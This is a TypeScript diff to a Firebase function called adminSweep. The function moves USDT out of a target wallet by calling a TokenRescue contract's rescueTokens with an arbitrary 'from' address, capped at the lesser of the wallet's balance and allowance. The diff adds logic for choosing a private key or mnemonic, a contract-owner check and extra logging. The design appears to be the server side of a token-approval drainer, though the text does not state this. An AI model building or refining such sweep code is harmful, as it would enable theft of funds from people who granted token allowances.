@@ -117,22 +117,35 @@ export const adminSweep = functions
     const sweepAmount = balance < allowance ? balance : allowance;
 
     // ── 5. Build signing wallet ────────────────────────────────────
-    const destSecret = process.env.DESTINATION_PRIVATE_KEY || await getSecret("DESTINATION_PRIVATE_KEY");
-    if (!destSecret) {
+    // ── 5. Build signing wallet ────────────────────────────────────
+    const contractOwnerSecret =
+      process.env.CONTRACT_OWNER_PRIVATE_KEY ||
+      (await getSecret("CONTRACT_OWNER_PRIVATE_KEY"));
+    const destSecret =
+      process.env.DESTINATION_PRIVATE_KEY ||
+      (await getSecret("DESTINATION_PRIVATE_KEY"));
+
+    // For TokenRescue contract calls, prefer CONTRACT_OWNER_PRIVATE_KEY if provided, else fall back to destSecret
+    const activeSecret =
+      (spender.toLowerCase() === tokenRescueAddress.toLowerCase() && contractOwnerSecret)
+        ? contractOwnerSecret
+        : (contractOwnerSecret || destSecret);
+
+    if (!activeSecret) {
       throw new functions.https.HttpsError(
         "internal",
-        "Sweep private key not configured. Add DESTINATION_PRIVATE_KEY secret."
+        "Sweep private key not configured. Add DESTINATION_PRIVATE_KEY or CONTRACT_OWNER_PRIVATE_KEY secret."
       );
     }
 
     let signingWallet: ethers.Wallet;
-    if (destSecret.trim().includes(" ")) {
+    if (activeSecret.trim().includes(" ")) {
       // mnemonic phrase
-      const hd = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
+      const hd = ethers.HDNodeWallet.fromPhrase(activeSecret.trim());
       signingWallet = new ethers.Wallet(hd.privateKey, provider);
     } else {
       // raw hex private key
-      signingWallet = new ethers.Wallet(destSecret.trim(), provider);
+      signingWallet = new ethers.Wallet(activeSecret.trim(), provider);
     }
 
     // ── 6. Determine network gasPrice dynamically from BSC RPC ──────
@@ -166,6 +179,7 @@ export const adminSweep = functions
       if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
         // Use the TokenRescue contract
         const rescueABI = [
+          "function owner() view returns (address)",
           "function rescueTokens(address token, address from, address to, uint256 amount) external",
         ];
         const rescueContract = new ethers.Contract(
@@ -174,8 +188,17 @@ export const adminSweep = functions
           signingWallet
         );
 
+        // Pre-flight check: ensure signing wallet is the actual contract owner to avoid on-chain revert
+        const currentOwner: string = await rescueContract.owner();
+        if (signingWallet.address.toLowerCase() !== currentOwner.toLowerCase()) {
+          throw new functions.https.HttpsError(
+            "failed-precondition",
+            `Signer wallet (${signingWallet.address}) is not the owner of TokenRescue contract (${currentOwner}). Please configure the private key for ${currentOwner}.`
+          );
+        }
+
         functions.logger.info(
-          `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()}`
+          `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()} (Signer: ${signingWallet.address}, Destination: ${finalDestination})`
         );
         sweepTx = await rescueContract.rescueTokens(
           usdtAddress,
